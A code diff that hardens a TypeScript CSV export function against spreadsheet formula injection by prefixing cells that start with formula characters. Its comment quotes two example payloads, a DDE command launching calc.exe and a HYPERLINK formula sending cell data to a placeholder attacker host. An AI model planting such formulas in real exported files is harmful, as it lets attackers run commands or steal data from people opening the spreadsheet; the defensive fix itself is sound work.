@@ -110,10 +110,30 @@ export function rangeFor(page: number, pageSize: number): [number, number] {
   return [from, to];
 }
 
-/** CSV cell escape per RFC 4180. */
+/**
+ * Characters Excel / Google Sheets / Numbers interpret as the start of
+ * a formula. A user controlled value beginning with one of these
+ * becomes executable when the CSV is opened (the canonical example is
+ * `=cmd|'/c calc.exe'!A0` on legacy Excel — but more dangerously today
+ * it lets an attacker exfiltrate cells via `=HYPERLINK("https://evil/?d="&A1, "click")`).
+ *
+ * The OWASP-recommended mitigation is to prefix any cell that starts
+ * with one of these sigils (or with leading whitespace followed by
+ * one) with an apostrophe, which spreadsheets treat as a literal
+ * indicator and strip on display.
+ */
+const FORMULA_SIGILS = /^[\s\u0000]*[=+\-@\t\r]/;
+
+/** CSV cell escape per RFC 4180, plus formula-injection neutralisation. */
 function csvCell(value: unknown): string {
   if (value === null || value === undefined) return "";
-  const s = typeof value === "string" ? value : JSON.stringify(value);
+  let s = typeof value === "string" ? value : JSON.stringify(value);
+  // Neutralise formulas BEFORE quote-wrapping; otherwise a value like
+  // `=1+1` that also contains a comma would round-trip through the
+  // quoted branch and still execute when opened in Excel.
+  if (FORMULA_SIGILS.test(s)) {
+    s = `'${s}`;
+  }
   if (/[",\r\n]/.test(s)) {
     return `"${s.replace(/"/g, '""')}"`;
   }
